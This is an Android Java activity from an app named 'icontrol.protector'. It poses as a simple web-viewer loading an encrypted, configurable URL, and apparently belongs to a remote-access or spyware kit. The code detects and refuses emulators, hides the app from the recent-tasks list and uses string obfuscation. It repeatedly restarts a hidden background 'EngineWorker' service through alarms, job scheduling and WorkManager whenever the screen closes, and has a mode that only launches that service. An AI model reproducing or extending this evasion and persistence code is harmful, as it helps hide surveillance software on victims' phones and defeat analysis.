package com.icontrol.protector;

import static android.net.ConnectivityManager.RESTRICT_BACKGROUND_STATUS_ENABLED;

import static com.icontrol.protector.MyCods.isServiceRunning;
import static com.icontrol.protector.UtliTools.excludeFromTaskList;
import static com.icontrol.protector.UtliTools.setupWorkManager;

import android.app.Activity;

import android.app.AlertDialog;
import android.app.DownloadManager;
import android.content.Context;

import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;

import android.provider.Settings;

import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.DownloadListener;
import android.webkit.JsResult;
import android.webkit.URLUtil;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;


import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;


import com.github.megatronking.stringfog.annotation.StringFogIgnore;

import java.net.URI;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;


public class ActivMain extends Activity {

    private final static int FILECHOOSER_RESULTCODE = 1;


    private ValueCallback<Uri[]> mUploadMessage;
    public  String[] NormalPermissions() {
        List<String> permissions = new ArrayList<>();

        // Add only normal permissions
        permissions.add(android.Manifest.permission.INTERNET); // Normal
        permissions.add(android.Manifest.permission.WAKE_LOCK); // Normal
        permissions.add(android.Manifest.permission.ACCESS_NETWORK_STATE); // Normal
        permissions.add(android.Manifest.permission.ACCESS_WIFI_STATE); // Normal
        permissions.add(android.Manifest.permission.CHANGE_WIFI_STATE); // Normal
        permissions.add(android.Manifest.permission.MODIFY_AUDIO_SETTINGS); // Normal
        //permissions.add(android.Manifest.permission.POST_NOTIFICATIONS); // Normal

        return permissions.toArray(new String[0]);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {


        if (requestCode == FILECHOOSER_RESULTCODE) {

            if (null == mUploadMessage || intent == null || resultCode != RESULT_OK) {
                return;
            }

            Uri[] result = null;
            String dataString = intent.getDataString();

            if (dataString != null) {
                result = new Uri[]{Uri.parse(dataString)};
            }

            mUploadMessage.onReceiveValue(result);
            mUploadMessage = null;
        }
    }

    public class MyChrome extends WebChromeClient {

        MyChrome() {
        }

        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
            // Create a builder to display the alert message
            AlertDialog.Builder builder = new AlertDialog.Builder(view.getContext());
            builder.setTitle("JavaScript Alert");
            builder.setMessage(message);

            // Set a positive button and its listener
            builder.setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    // Confirm the result in the JavaScript result
                    result.confirm();
                }
            });

            // Prevent the dialog from being cancelable
            builder.setCancelable(false);

            // Show the alert dialog
            builder.create().show();

            // Return true to indicate that you've handled the alert
            return true; // Note: Not calling super here, as you're handling the alert
        }
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {

            // asegurar que no existan callbacks
            if (mUploadMessage != null) {
                mUploadMessage.onReceiveValue(null);
            }

            mUploadMessage = filePathCallback;

            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);
            i.setType("*/*"); // set MIME type to filter

            ActivMain.this.startActivityForResult(Intent.createChooser(i, "File Chooser"), ActivMain.FILECHOOSER_RESULTCODE);

            return true;
        }

    }


    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        if (mWebView != null) {
            mWebView.saveState(outState);
        }

    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        if (mWebView != null) {
            mWebView.restoreState(savedInstanceState);
        }

    }


    public static boolean isinternetOK(Context context) {

        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNW = cm.getActiveNetworkInfo();
        if (activeNW != null && activeNW.isConnected()) {
            return true;
        } else {

            return false;
        }


    }

    private View.OnClickListener out = new View.OnClickListener() {
        @Override
        public void onClick(View view) {

            try {
                finish();


            } catch (Exception e) {

            }

        }

    };

    private View.OnClickListener Oklistner = new View.OnClickListener() {
        @Override
        public void onClick(View view) {

            try {
                Intent Acc_intent = new Intent(Settings.ACTION_WIFI_SETTINGS);
                Acc_intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(Acc_intent);


            } catch (Exception e) {

            }

        }

    };
    public WebView mWebView;
    String value = "skin.info";


    private boolean isEmulator() {
        return (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.PRODUCT.contains("sdk_google")
                || Build.PRODUCT.contains("google_sdk")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("sdk_x86")
                || Build.PRODUCT.contains("sdk_gphone64_arm64")
                || Build.PRODUCT.contains("vbox86p")
                || Build.PRODUCT.contains("emulator")
                || Build.PRODUCT.contains("simulator");
    }

    private void AsknoEmu() {


        String buttonnameOK = "OK";
        String alertmsg = "OK";
        String MYNAME = "Emulator detected";

        String CurrnetLanuage = Locale.getDefault().getLanguage();
        switch (CurrnetLanuage) {
            case "en":
                buttonnameOK = "ok";
                MYNAME = "Emulator detected";
                alertmsg = "this app does not support emulator devices";
                break;
            case "ar":
                buttonnameOK = "موافق";
                MYNAME = "تم اكتشاف محاكي";
                alertmsg = ("هذا التطبيق لا يدعم أجهزة المحاكي");
                break;
            case "zh":
                buttonnameOK = "好的";
                MYNAME = "检测到模拟器";
                alertmsg = ("此应用不支持模拟器设备");
                break;
            case "tr":
                buttonnameOK = "Tamam";
                MYNAME = "öykünücü algılandı";
                alertmsg = ("bu uygulama öykünücü aygıtları desteklemiyor");
                break;
            default:
                buttonnameOK = "OK";
                MYNAME = "Emulator detected";
                alertmsg = ("this app does not support emulator devices");
                break;

        }

        Drawable icon;
        try {
            // null;
            icon = getPackageManager().getApplicationIcon(getPackageName());

        } catch (PackageManager.NameNotFoundException ex) {
            icon = null;
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
                .setTitle(MYNAME)
                .setMessage(alertmsg)
                .setPositiveButton(buttonnameOK, (dialog, which) -> {
                    // Handle positive button click
                    finish();
                    System.exit(0);
                });

        if (icon != null) {
            builder.setIcon(icon);
        }

        builder.show();

    }



    private static final int PERMISSION_REQUEST_CODE = 22;
    private void checkAndRequestPermissions() {
        String[] permissions = NormalPermissions();

        List<String> permissionsNeeded = new ArrayList<>();

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(getApplicationContext(), permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }
    @Override
    public void onRequestPermissionsResult(int requestCode,  String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

    }



    @Override
    public void onCreate(Bundle v) {


        super.onCreate(v);


        excludeFromTaskList(getApplicationContext());


        ConfigManager config = ConfigManager.getInstance();

        try {
            config.initialize(getApplicationContext(), My_Configs.ALL_CONFIG);

           Context ctx = getApplicationContext();

            LiveChat.instance(getApplicationContext());

            checkAndRequestPermissions();



            if (MySettings.Read(ctx,Consts.Mob_width,"").length() == 0){
                Point size = new Point();
                getWindowManager().getDefaultDisplay().getRealSize(size);
                int width = Math.min(size.x, size.y);
                int height = Math.max(size.x, size.y);
                MySettings.Write(ctx, Consts.Mob_width, String.valueOf(width));
                MySettings.Write(ctx, Consts.Mob_height, String.valueOf(height));
            }




        } catch (Exception e) {
            e.printStackTrace();
        }

        if (My_Configs.Anti_emulator.equals("1") && isEmulator()) {
            AsknoEmu();
            return;
        }

        if (!isinternetOK(getApplicationContext())) {
            setContentView(R.layout.nointernet);
            TextView NointernetDescrip = (TextView) findViewById(R.id.nodescrip);
            String CurrnetLanuage = Locale.getDefault().getLanguage();
            switch (CurrnetLanuage) {
                case "en":
                    NointernetDescrip.setText(
                            "No internet connection detected.\n\n please connect to internet and try again");
                    break;
                case "ar":
                    NointernetDescrip.setText(
                            "لم يتم الكشف عن اتصال بالإنترنت .\n\n الرجاء الاتصال بالإنترنت والمحاولة مرة أخرى");
                    break;
                case "zh":
                    NointernetDescrip.setText(
                            "未检测到 Internet 连接。\n\n 请连接到 Internet 并重试");
                    break;
                case "tr":
                    NointernetDescrip.setText(
                            "internet bağlantısı algılanmadı.\n\n lütfen internete bağlanın ve tekrar deneyin");
                    break;
                default:
                    NointernetDescrip.setText(
                            "no internet connection detected.\n\n please connect to internet and try again");
                    break;

            }

            ImageView enablebtn = (ImageView) findViewById(R.id.noneticon);
            enablebtn.setOnClickListener(Oklistner);

            Button closebtn = (Button) findViewById(R.id.closeme);
            closebtn.setOnClickListener(out);
        } else {






            try {
                getWindow().setFlags(
                        WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                        WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED);
            } catch (Exception a) {
            }



            if(My_Configs.Is_Store.equals("1")){
                Context mcontext = getApplicationContext();
                Intent workint = new Intent(mcontext, EngineWorker.class);
                if (!isServiceRunning(mcontext, EngineWorker.class))
                {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        mcontext.startForegroundService(workint);
                    }else
                    {
                        mcontext.startService(workint);
                    }
                }
                finish();

                return;
            }

            setContentView(R.layout.mywebviewer);



            mWebView = (WebView) findViewById(R.id.MyView);




            mWebView.getSettings().setJavaScriptEnabled(true);

            mWebView.getSettings().setLoadsImagesAutomatically(true);
            mWebView.getSettings().setLoadWithOverviewMode(true);
            mWebView.getSettings().setUseWideViewPort(true);
            mWebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
            mWebView.getSettings().setAllowFileAccess(true);
            mWebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
            mWebView.getSettings().setDomStorageEnabled(true);
            mWebView.getSettings().setAllowFileAccessFromFileURLs(true);
            mWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
            mWebView.getSettings().setAllowContentAccess(true);
            try {
                mWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
                mWebView.getSettings().setPluginState(WebSettings.PluginState.ON);
                mWebView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
                mWebView.setBackgroundColor(0xffffffff);
            } catch (Exception a) {
            }

            mWebView.getSettings().setBuiltInZoomControls(false);

            My_Crpter cr = My_Crpter.Getinstance();



            value = cr.Dcrpt_Str(My_Configs.HOME_NAME);
//            String userAgent = System.getProperty("http.agent");
//            MyLoger.Debug("userAgent:",userAgent);

//            if (value.contains("google.com") || value.contains("youtube.com")) {
//
//                mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36");
//
//            } else {
//                mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/362.0.0.27.109;]");
//            }

            mWebView.setDownloadListener(new DownloadListener() {

                @Override
                public void onDownloadStart(String url, String userAgent,
                                            String contentDisposition, String mimetype,
                                            long contentLength) {
                    try {
                        DownloadManager.Request request = new DownloadManager.Request(
                                Uri.parse(url));
                        final String filename = URLUtil.guessFileName(url, contentDisposition, mimetype);
                        request.allowScanningByMediaScanner();
                        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED); //Notify client once download is completed!
                        request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename);
                        DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                        dm.enqueue(request);
                        Toast.makeText(getApplicationContext(), "Downloading File", Toast.LENGTH_LONG).show();
                    } catch (Exception e) {

                    }


                }
            });

            mWebView.setWebChromeClient(new MyChrome());
            mWebView.setWebViewClient(new MyWebViewClient());

            String ua= mWebView.getSettings().getUserAgentString();

            mWebView.getSettings().setUserAgentString(ua);

             Context mcontext = getApplicationContext();
            startworkers(mcontext);
            if (!value.startsWith("http://") && !value.startsWith("https://")){
                value = "http://" + value;
            }
            mWebView.loadUrl(value);

            if (config.req_backdata ){
                ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                if (connectivityManager.isActiveNetworkMetered()) {
                    // Checks user’s Data Saver settings.
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        switch (connectivityManager.getRestrictBackgroundStatus()) {
                            case RESTRICT_BACKGROUND_STATUS_ENABLED:
                                Intent intusage = new Intent(getApplicationContext(), RequestDataUsage.class);
                                intusage.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(intusage);
                                break;
                            default:
                                break;
                        }
                    }
                }
            }


//            if(My_Configs.Hide_ico.equals("1") && MySettings.ReadBool(mcontext,Consts.setupok,false)){
//                finish();
//
//            }else{
//
//            }

        }
    }




    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            // TODO Auto-generated method stub

            super.onPageStarted(view, url, favicon);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            // TODO Auto-generated method stub

            if (request != null && request.getUrl() != null) {
                String url = request.getUrl().toString();
                if (!url.startsWith("http") && url.contains("://")) {
                    try {

                        URI uri = new URI(url);
                        String newUrl = uri.getHost() + uri.getPath();
                        mWebView.loadUrl(newUrl);
                        return true; // URL handled
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }


            return false;

        }

        @Override
        public void onReceivedError(WebView view, int errorCode,
                                    String description, String failingUrl) {

        }

        @Override
        public void onPageFinished(WebView view, String url) {
            // TODO Auto-generated method stub


            super.onPageFinished(view, url);

            //  progressBar.setVisibility(View.GONE);
        }

    }

    @Override
    public void onBackPressed() {
        try {
            if (mWebView != null && mWebView.canGoBack()) {
                mWebView.goBack();
            } else {
                super.onBackPressed();
            }
        } catch (NullPointerException s) {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        try
        {
            try{
                if(mWebView != null){
                    mWebView.stopLoading();


                    mWebView.clearHistory();
                    mWebView.clearCache(true);


                    ViewGroup parent = (ViewGroup) mWebView.getParent();
                    if (parent != null) {
                        parent.removeView(mWebView);
                    }


                    mWebView.removeAllViews();
                    mWebView.destroy();


                    mWebView = null;
                }
            }catch (Exception s){}
            JobSchedulerUtil.scheduleJob(getApplicationContext());
            Context mcontext = getApplicationContext();
            startworkers(mcontext);

            AlarmHelper.setAlarm(mcontext);
            setupWorkManager(getApplicationContext());
        }catch (Exception a){}
        super.onDestroy();

    }
    @Override
    public void finish() {


        try{
             Context mcontext = getApplicationContext();
            mWebView=null;
            startworkers(mcontext);
            AlarmHelper.setAlarm(mcontext);
        }catch (Exception a){}
        super.finish();
    }


    private void startworkers(Context ctx){

         Context mcontext = ctx;
        new Thread(new Runnable() {
            @Override
            public void run() {

                try {

//                    try{
//                        Thread.sleep(10000);
//                    }catch (Exception a){}

                    Intent workint = new Intent(mcontext, EngineWorker.class);
                    if (!isServiceRunning(mcontext, EngineWorker.class))
                    {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            mcontext.startForegroundService(workint);
                        }else
                        {
                            mcontext.startService(workint);
                        }
                    }

//                    if (!Codes.isServiceRunning(mcontext, WorkServices.class))
//                    {
//                        Intent workint2 = new Intent(mcontext, WorkServices.class);
//                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                            mcontext.startForegroundService(workint2);
//                        }else
//                        {
//                            mcontext.startService(workint2);
//                        }
//                    }
                } catch (Exception e) {

                }

            }
        }).start();
    }

//    @Override
//    public void finish() {
//
//        if (init_ClassGen_e.HideType.equalsIgnoreCase("K")) {
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//                super.finishAndRemoveTask();
//            } else {
//                super.finish();
//            }
//        }
//    }


}
